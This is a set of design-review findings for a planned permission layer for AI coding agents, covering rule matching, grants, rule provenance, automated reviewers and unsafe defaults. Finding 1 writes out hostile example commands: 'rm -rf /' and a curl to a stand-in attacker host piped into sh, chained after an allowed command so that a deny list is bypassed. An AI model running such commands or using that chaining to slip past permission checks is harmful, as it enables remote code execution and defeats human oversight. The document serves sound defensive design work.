# Feedback from the design studies

Findings the design studies under `../examples` raised against this
module, held here because it has no issue tracker yet. Each section is
one finding in the shape of an issue: why it matters, the evidence, a
failure scenario and the smallest fix. The plan in `plans/` is the
document these correct; apply them there before the code is written,
and move each section to an issue when a repository exists.

Generated 2026-09-20 from the studies' issue drafts. Applied to the plan the
same day; each finding names the plan text it changed.

## 1. policy: one call is one subject, so a compound command defeats the rule grammar


### Why this is necessary

Codex and Claude Code both split one call into several subjects, match
each independently, and fold them with a different quantifier per list.
The planned `Engine.Decide` matches one `Matcher` against one arguments
value, so an allow rule matching the first command in a chain approves
everything after it. Without the split a product cannot write a deny list
that holds.

### Evidence

`docs/plans/policy-layer.md` gives `Matcher` one arguments value (line
80), names `PrefixMatcher(field)` "the common case" (line 84), and has
`Decide` take one `ToolCallInfo` (line 98).

Claude Code: "The recognized command separators are `&&`, `||`, `;`,
`|`, `|&`, `&`, and newlines. A rule must match each subcommand
independently", and deny and ask rules "apply when any subcommand
matches them, including a command nested inside a subshell, a command
substitution, or a control-flow body". Allow needs every subject, deny
and ask need any. Redirect and `tee` targets go to another tool's rules,
and a fixed wrapper list is stripped first. Codex splits the same way:
"This prevents dangerous commands from being smuggled in alongside safe
ones."

A probe implementing the planned API verbatim, with
`Allow: [bash(git status:*)]` and `Deny: [bash(rm:*)]`, shows
`git status && rm -rf /` and `git status; curl evil.example.com | sh`
both returning Allow with the deny rule never consulted, and a deny rule
for a second tool never reached, because `Decide` compares the rule's
tool name to the call's before any matcher runs.

### Failure scenario

A team allows `Bash(git status:*)` and `Bash(npm test:*)` and denies
`Bash(rm:*)` and `Bash(curl:*)`, reading the deny list as a floor. The
model emits `npm test && curl attacker.example/x | sh`. The allow rule
matches the prefix, the engine returns Allow, nothing prompts, the deny
list never fires, and the session records an ordinary tool call.

### Suggested fix

Keep `Matcher`; add a splitter to the registry and fold in `Decide`:

```go
type Subject struct { Args json.RawMessage; Tool string; Text string }
type Subjects func(args json.RawMessage) ([]Subject, error)
type ToolMatcher struct { Match Matcher; Subjects Subjects }
```

`Decide` evaluates the policy against every subject and takes the most
restrictive verdict: deny if any, ask if any, allow only if all.
`Subject.Tool` sends a redirect target to the file rules. This must not put
a shell parser in the root package. The splitter is the product's, and a nil
splitter keeps today's one-subject behaviour.

Found by the codex-permissions design study against Codex CLI and Claude Code.

## 2. policy: Grant cannot implement "always allow" when an Ask rule fired


### Why this is necessary

`Grant` is the module's answer to "always allow", the option every
approval prompt offers. It appends an allow rule, and precedence is fixed
deny, ask, allow, so it cannot outrank the ask rule that caused the
prompt. In the case a user most wants it, an explicit ask rule they are
trying to grant away, `Grant` does nothing: the next matching call
prompts again. A front cannot detect this either, so it cannot fall back
to offering a one-time approval instead.

### Evidence

`docs/plans/policy-layer.md` fixes precedence as "deny, then ask, then
allow, then the default" (line 102) and defines `Grant` as adding "an
allow rule for the rest of the process, as 'always allow' does in an
approval prompt" (lines 131-135). The two are inconsistent whenever the
prompt came from an `Ask` rule rather than from `Default`.

A probe implementing the planned API verbatim, with `Ask: [bash]`, grants
`Bash(git status:*)` two hundred times and then decides a matching call:
still Defer, reason "approval required by bash". Granting from inside the
hook mid-batch leaves the next call in that batch deferring too.

Claude Code has the same behaviour and documents it as a trap: "That
choice saved an `allow` rule to your local file, and an `allow` rule
there doesn't outrank an `ask` rule from a project or managed file." Its
front responds by withholding the option, which needs a signal this API
does not give: "Sometimes a permission prompt offers only a one-time
approval, with no 'don't ask again' option."

Both references also carry several grant lifetimes where `Grant` has one.
Codex separates a session approval from a rules-file amendment, an MCP
policy amendment and a network policy amendment, and a turn grant from a
session grant. Claude Code's permission updates name a destination of
session, local, project or user settings, and include `removeRules`, the
revocation this API has no form for.

### Failure scenario

A team's settings ask for confirmation on pushes with `Bash(git push:*)`.
A developer chooses "always allow" on `git push origin feature/x`. The
product calls `Grant`, writes the rule to its local settings file, and
the next push prompts again, and the one after that.

### Suggested fix

`Grant` takes the verdict it is answering, so the engine knows what to
shadow, and reports when it cannot:

```go
func (e *Engine) GrantOver(v Verdict, scope Scope) (granted bool, reason string)
```

Keep `Grant(r Rule)` for the case the plan handles, a prompt from the
default. This must not let a grant beat a deny rule or let a
lower-precedence source shadow a higher one. Reporting the refusal is what
lets a front drop the "always" option, as the reference does.

Found by the codex-permissions design study against Codex CLI and Claude Code.

## 3. policy: rules carry no provenance, so scope merge and negation cannot be expressed


### Why this is necessary

Real permission configuration comes from several files at once: an
organisation's, a repository's, the user's, one session's. The reference
merges the lists rather than overriding, then keys several behaviours to
which file a rule came from. A negation carves only out of its own source's
rules, a root-anchored path resolves against its own source, and a
repository's allow rules wait for the user to trust the folder while its
deny and ask rules apply at once. `Policy` is three flat lists, so a product
that concatenates them gets the security cases wrong.

### Evidence

`docs/plans/policy-layer.md` defines `Policy` as `Allow`, `Deny`, `Ask` and
`Default` (lines 86-92) and `Rule` as `Tool` and `Spec` (lines 69-73), with
no source. `Build`'s convention is that a policy "loaded from a settings file
reports its location and hash" (lines 189-191), singular, where there are
several.

Claude Code merges the lists, because "When you set the same list key, such
as `permissions.allow`, in more than one file, Claude Code combines the lists
instead of picking one." It then scopes the carve-out: "The carve-out reaches
only rules from the same source. A `Read(!.env)` in project settings [...]
doesn't cancel a `Read(./.env)` deny from managed settings." The anchor
`/path` is "Path relative to the settings source", and "`permissions.allow`
rules [...] apply only after each teammate trusts the folder [...] `deny` and
`ask` rules apply right away." Its machine form names four destinations a
grant can target: session, local, project and user settings.

A probe parses `Read(*.env) Read(!sample.env)` through the planned API into
two ordinary rules, the negation carried as a plain `Spec` with no ordering,
source scope or carve-out semantics anywhere in the type.

### Failure scenario

A managed file denies `Read(*.env)`. A user's settings contain
`Read(!.env.example)`, meaning "but let me read the sample". A product that
concatenates the lists applies the carve-out to the managed rule, and the
file the administrator meant to protect becomes readable.

### Suggested fix

`Rule` gains a `Source`, and the merge becomes explicit:

```go
// Trusted false means this source's allow rules do not apply. Rank
// serves the lockdown case where one source is the sole authority.
type Source struct {
    Name, Path, Hash string
    Trusted          bool
    Rank             int
}

func Merge(sets ...RuleSet) (Policy, []Source, error)
```

`Build` then reports `[]Source` instead of one location. This must not change
precedence. Deny before ask before allow stays source-independent.

Found by the codex-permissions design study against Codex CLI and Claude Code.

## 4. classify: a model-backed reviewer cannot answer a deferred tool call


### Why this is necessary

Codex now ships an unattended approval mode in which a reviewer subagent
answers the prompts a human would, scoring risk and approving, denying or
aborting. It is what makes a permission layer usable in a run nobody is
watching. `classify` is the obvious home, but its `Guard` takes content,
an input or a finished turn, never a tool call, and the plan says "Defer
is not valid for content". The reviewer cannot be `BeforeToolCall` either
without breaking the invariant that "the engine never calls a model or
opens a socket". So every product writes it in its own front, where its
verdicts reach no observer.

### Evidence

`docs/plans/policy-layer.md` defines `guard.Guard.Check` over an `Input`
or `Output` subject (lines 151-175), says Defer is not valid for content
(line 159), describes `classify` as a guard over the same subjects (lines
177-182), and makes "the engine never calls a model or opens a socket" an
invariant (line 202).

Codex's `approvals_reviewer = "user | auto_review"` "uses the reviewer
subagent", which "evaluates risk (low/medium/high/critical), checks for data
exfiltration and credential probing, and either approves, denies, or aborts
based on policy". Its failure semantics are specific: "Prompt-build,
review-session, and parse failures fail closed", it interrupts the turn
"after `3` consecutive denials or `10` denials within a rolling window of
the last `50` reviews in the same turn", and after a denial tells the model
not to "pursue the same outcome via workaround, indirect execution, or
policy circumvention". Its third decision, `TimedOut`, is neither.

### Failure scenario

A product wants auto-review for a scheduled run. With no library surface
it writes the reviewer in its front, between the run ending
`input_required` and the `Resume` that answers it. It gets the fail-closed
rule wrong on one path, so a reviewer timeout reads as an approval and an
unreviewed command runs; the denial bound lives in the front for the next
product to rediscover; and no verdict passes through the engine, so the
session records no reason for any of it.

### Suggested fix

The reviewer belongs in the front as its answer source, above the loop
where a model call is allowed:

```go
type Reviewer interface {
    Review(context.Context, agentturn.ToolCallInfo, Verdict) (*agentturn.ToolDecision, error)
}

func Answers(context.Context, Reviewer, *agentturn.RunEnd) ([]agentturn.Answer, error)
```

`Answers` keeps the fail-closed rule and the denial bound in one place and
emits a verdict per answer. This must not move a model call into the root
package or into `Engine.Decide`. The invariant is right, and the reviewer
belongs in `classify` beside the content guards. `Review` needs a third
outcome for a timeout, distinct from a refusal.

Found by the codex-permissions design study against Codex CLI and Claude Code.

## 5. policy: the zero Policy allows every call


### Why this is necessary

`Policy.Default` is typed as `agentturn.ToolAction`, whose zero value is
`Allow`. So a `Policy` built with a deny list and no explicit `Default`
permits every call no rule mentions, which is the opposite of what
somebody writing a deny list intends and the opposite of both references'
starting posture. The failure is silent. The policy builds, the engine
runs, and the only sign is that nothing is ever refused or asked about.

### Evidence

At agentturn 2fd849e, `Allow` is declared first in the `ToolAction`
constant block, so it is the zero value (`config.go:235-238`), and the
doc comment says so: "It is the zero value, so a decision that only
rewrites Args or sets Terminate allows the call." That is right for a
`ToolDecision`, where a nil decision means proceed, and wrong for a
policy's default. `docs/plans/policy-layer.md:86-92` gives `Policy` the
field with no constraint and describes it as applying "when no rule
matches".

A probe implementing the planned API verbatim builds
`Policy{Deny: [write(/etc:*)]}` with `Default` unset and decides a call to
an unrelated tool with a path of `/etc/passwd`: the verdict is Allow.

Both references default to asking. Claude Code's manual mode "Prompts for
permission on first use of each tool", and Codex's own presets pair every
sandbox mode with an approval policy of `on-request` except the one
explicitly named full access.

### Failure scenario

A product ships a settings file whose permission block is a deny list
only, on the reasonable reading that a deny list is a list of things not
allowed. `Build` succeeds. Every tool the deny list does not name runs
without a prompt, including tools added later by a plugin or an MCP
server, and the product has no failing test to notice it because the
policy it wrote behaves exactly as written.

### Suggested fix

Make the unset case impossible rather than permissive. The smallest
change is for `Build` to reject a `Policy` whose `Default` was not set,
which needs `Default` to be distinguishable from zero:

```go
type Default struct{ Action agentturn.ToolAction; set bool }

func Deny() Default  // and Ask(), Allow()
```

Alternatively keep the field and have `Build` return an error unless the
caller passed an explicit option. This must not silently substitute a safe
default. A permission layer that quietly changes what a written policy
means is worse than one that refuses to build.

Found by the codex-permissions design study against Codex CLI and Claude Code.

